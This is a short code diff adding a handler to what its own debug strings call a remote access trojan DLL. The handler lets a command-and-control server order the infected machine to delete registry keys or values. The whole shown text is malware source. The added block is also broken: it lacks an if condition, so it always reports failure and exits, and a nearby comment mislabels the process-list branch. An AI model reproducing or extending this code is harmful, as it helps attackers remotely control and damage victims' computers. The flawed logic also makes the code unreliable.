@@ -188,6 +188,18 @@ INT startListen()
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed registry read!\n");
             }
 
+            // C2 says to delete a registry key or value 
+            else if (strcmp((const char*) & recvBuf, REGDELETE) == 0)
+            {
+                status = handleRegDelete(clientSock);
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleRegDelete %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed registry delete!\n");
+            }
+
             // C2 says to read a registry key 
             else if (strcmp((const char*)&recvBuf, PROCESSLIST) == 0)
             {
